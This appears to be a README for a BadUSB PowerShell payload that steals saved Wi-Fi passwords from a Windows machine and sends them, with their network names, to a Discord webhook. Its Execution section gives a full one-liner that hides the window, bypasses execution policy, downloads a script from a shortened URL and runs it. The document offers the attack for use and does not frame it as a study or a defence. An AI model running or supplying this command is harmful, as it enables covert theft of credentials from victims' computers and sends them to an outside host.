# Win-Wifi-Pwds.ps1 - BadUSB

A script used to exfiltrate WLAN Passwords off of a Windows machine via Discord web hooks.

**Category**: WLAN, Credentials

## Description

A script used to exfiltrate WLAN Passwords off of a Windows machine via Discord web hooks.

Opens a hidden PowerShell window, grabs wlan passwords, saves as a cleartext in a variable and exfiltrates info via Discord Webhook. The webhook message will include the SSID and the password to easily identify credentials and associated SSIDs.

## Execution

The following command will create the "$discord" variable, pull down and invoke the 'Win-Wii-Pwds.ps1' poershell script.

```powershell
powershell -w h -ep bypass $discord='<your_webhook_URL_here>';irm https://tinyurl.com/ckadlov-win-wifi1 | iex
```

## Credits

<a href="https://github.com/aleff-github">Aleff :octocat:</a>